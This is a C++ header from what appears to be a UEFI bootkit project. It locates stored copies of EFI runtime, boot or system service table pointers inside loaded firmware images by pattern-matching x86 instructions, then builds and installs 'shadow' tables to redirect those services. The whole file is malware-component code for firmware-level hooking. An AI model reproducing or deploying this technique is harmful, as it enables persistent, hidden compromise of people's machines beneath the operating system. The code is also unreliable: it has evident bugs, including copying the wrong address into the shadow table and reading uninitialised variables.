#ifndef SHADOW_TABLE_HPP_
#define SHADOW_TABLE_HPP_

#include <bootkit/general.hpp>
#include <bootkit/uefi_internals.hpp>
#include <bootkit/binary/heuristic.hpp>
#include <bootkit/binary/pe.hpp>

#include <type_traits>

extern "C" {
#include <Uefi.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
}

template<typename TABLE_T>
  requires(std::is_same_v<TABLE_T, EFI_RUNTIME_SERVICES> ||
           std::is_same_v<TABLE_T, EFI_BOOT_SERVICES> ||
           std::is_same_v<TABLE_T, EFI_SYSTEM_TABLE>)
TABLE_T **find_candidate_table_copy(int32_t member_offset, UINT32 event_type = 0)
{
  TABLE_T **table_copy;
  TABLE_T *original;
  unsigned int best_ref_count;
  BOOLEAN res;

  if constexpr (std::is_same_v<TABLE_T, EFI_RUNTIME_SERVICES>)
    original = g::rt;
  else if constexpr (std::is_same_v<TABLE_T, EFI_BOOT_SERVICES>)
    original = g::bs;
  // is this ever reasonable here?
  else if constexpr (std::is_same_v<TABLE_T, EFI_SYSTEM_TABLE>)
    original = g::rt;

  if (original == nullptr)
    return nullptr;

  table_copy = nullptr;
  auto search_image_for_copies = [&](uintptr_t img_base) -> BOOLEAN {
    TABLE_T **current_table_copy;
    uintptr_t data_base;
    uintptr_t data_size;
    unsigned int current_best_ref_count;

    if (!img_base)
      return FALSE;

    if (!pe::get_section(img_base, ".data", &data_base, &data_size))
      return FALSE;

    current_best_ref_count = 0;
    for (uintptr_t i = 0; i < data_size / 8; i++) {
      void **c = reinterpret_cast<void **>(data_base);
      unsigned int current_ref_count = 0;

      if (original == reinterpret_cast<TABLE_T *>(c[i])) {
        uint8_t *p;
        uintptr_t code_base, code_size;

        if (!pe::get_code_section(img_base, &code_base, &code_size) || code_size < 4096)
          continue;

        p = reinterpret_cast<uint8_t *>(code_base);
        for (uintptr_t j = 3; j < code_size - 34; j++) {
          int32_t disp32 = *reinterpret_cast<int32_t *>(&p[j]);
          if (code_base + j + disp32 + 4 == reinterpret_cast<uintptr_t>(&c[i])) {
            uint8_t mov_modrm;
            uint8_t mov_rex;
            uint8_t mov_reg;

            if (!P_IS_REX(p[j - 3]) || p[j - 2] != 0x8b /* MOV */)
              continue;

            mov_rex = p[j - 3];
            mov_modrm = p[j - 1];
            mov_reg = (mov_modrm >> 3) & 0b111; // reg
            if (!(mov_rex & P_W_BIT))
              continue;

            for (int k = 4; k < 31; k++) {
              if (p[j + k] == 0xFF) {
                uint8_t call_rex = k != 4 && P_IS_REX(p[j + k - 1]) ? p[j + k - 1] : 0;
                uint8_t call_modrm = p[j + k + 1];
                uint8_t call_mod = call_modrm >> 6;
                uint8_t call_rm = call_modrm & 0b111;
                bool mov_extended_reg = !!(mov_rex & P_R_BIT);
                bool call_extended_reg = !!(call_rex & P_B_BIT);
                bool is_calling = false;
                // dst register mismatch
                if (mov_extended_reg != call_extended_reg || call_rm != mov_reg)
                  continue;

                if (call_mod == 0b01) {
                  // if it doesn't fit in disp8, discard
                  if (member_offset > INT8_MAX || member_offset < INT8_MIN)
                    continue;

                  is_calling = member_offset == static_cast<int8_t>(p[j + k + 2]);
                }
                else if (call_mod == 0b10)
                  is_calling = member_offset == *reinterpret_cast<int32_t *>(&p[j + k + 2]);
                else
                  continue;

                if (is_calling) {
                  current_ref_count++;
                  if (current_best_ref_count < current_ref_count) {
                    current_best_ref_count = current_ref_count;
                    current_table_copy = reinterpret_cast<TABLE_T **>(&c[i]);
                  }
                }
              }
            }
          }
        }
      }
    }

    if (best_ref_count >= current_best_ref_count || current_table_copy == nullptr)
      return FALSE;

    table_copy = current_table_copy;
    return TRUE;
  };

  if (event_type) {
    auto find_with_event = [&](IEVENT *current) -> BOOLEAN {
      uintptr_t module_base;
      uintptr_t callback;

      if (current->Type != event_type)
        return FALSE;

      callback = reinterpret_cast<uintptr_t>(current->NotifyFunction);
      if (!callback)
        return FALSE;

      module_base = heuristic::retroactive_find_pe_base(callback);
      return search_image_for_copies(module_base);
    };

    res = iterate_events(find_with_event);
  }
  else {
    auto find_with_image = [&](EFI_RUNTIME_IMAGE_ENTRY *current) -> BOOLEAN {
      uintptr_t module_base = reinterpret_cast<uintptr_t>(current->ImageBase);
      return search_image_for_copies(module_base);
    };

    res = iterate_images(find_with_image);
  }

  if (!res)
    return nullptr;

  return table_copy;
}

template<typename TABLE_T>
  requires(std::is_same_v<TABLE_T, EFI_RUNTIME_SERVICES> ||
           std::is_same_v<TABLE_T, EFI_BOOT_SERVICES> ||
           std::is_same_v<TABLE_T, EFI_SYSTEM_TABLE>)
TABLE_T *create_shadow_table(TABLE_T *original)
{
  TABLE_T *shadow_table = reinterpret_cast<TABLE_T *>(AllocateRuntimePool(sizeof(TABLE_T)));
  if (shadow_table == nullptr)
    return nullptr;
  
  CopyMem(shadow_table, &original, sizeof(TABLE_T));
  return shadow_table;
}

template<typename TABLE_T>
  requires(std::is_same_v<TABLE_T, EFI_RUNTIME_SERVICES> ||
           std::is_same_v<TABLE_T, EFI_BOOT_SERVICES> || std::is_same_v<TABLE_T, EFI_SYSTEM_TABLE>)
TABLE_T *install_shadow_table(TABLE_T **target_copy, TABLE_T *shadow_table)
{
  TABLE_T *original = *target_copy;
  *target_copy = shadow_table;
  return original;
}

#endif // SHADOW_TABLE_HPP